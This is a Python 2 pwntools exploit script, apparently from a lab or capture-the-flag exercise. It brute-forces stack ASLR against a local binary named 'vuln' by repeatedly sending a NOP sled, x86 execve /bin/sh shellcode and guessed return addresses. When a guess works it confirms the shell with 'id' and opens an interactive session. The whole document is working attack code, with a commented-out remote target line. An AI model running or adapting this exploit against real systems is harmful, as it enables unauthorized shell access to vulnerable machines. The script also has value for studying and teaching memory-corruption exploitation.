#!/usr/bin/python

from pwn  import *
from time import sleep
from copy import deepcopy
from sys  import stdout

# Linux/x86 execve /bin/sh - Hamza Megahed
# http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
             "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")

stack_start = 0xfffdd000
stack_end   = 0xffffe000

offset = 256 
nop    = "\x90"*200
eip    = stack_start
pad    = "A"*(offset - len(nop) - len(shellcode))

bar = ["=" for _ in range(51)]
stack_range = stack_end - stack_start
rev = False

print "\33[1m\33[32m[*]\33[0m  Brute forcing ASLR....."
while (True):
    
    # -------------- Progress bar ------------------ #

    p = (eip - stack_start)*100/stack_range
    percen = "\33[34m" + str(p) + "%" + "\033[0m"
    ip = "\33[1m\33[31m" + str(hex(eip)) + "\033[0m"
    tmp = deepcopy(bar)
    tmp[p/2] = ip
    s = "".join(tmp)
    
    string  = ip 
    string += ": "
    string += "\33[1m("+str(hex(stack_start))+")\033[0m"
    string += s
    string += "\33[1m("+str(hex(stack_end))+")\033[0m"
    string += " "
    string += percen
    string += "\n"

    stdout.write(string)
    stdout.write("\x1b[A")
    stdout.flush()
    
    # -------------- End progress bar -------------- #
    
    sleep(0.001)
    if (eip > stack_end):   rev = True
    if (eip < stack_start): rev = False

    payload  = ""           # payload
    payload += nop          # nope sled of 200 bytes
    payload += shellcode    # shellcode
    payload += pad          # some padding
    payload += p32(eip)*8   # eip to jump to
    payload += nop*2        # a bigger nop sled 
    payload += shellcode    # shellcode at the end
    
    #r = remote("localhost", 1337, level='error')
    r = process("./vuln", level='error')
    
    #print payload.encode('hex')
    try:
        r.sendline(payload)
        r.sendline("id")
        data = r.recv(1024)
        #print len(data)
        if len(data) <= 5:
            continue
        print string 
        print "\33[1m\33[32m[*]\33[0m Popped!"
        print(data)
        r.interactive()
    except:
        r.close()
    
    if rev == False:
        eip += 180
    else:
        eip -= 180
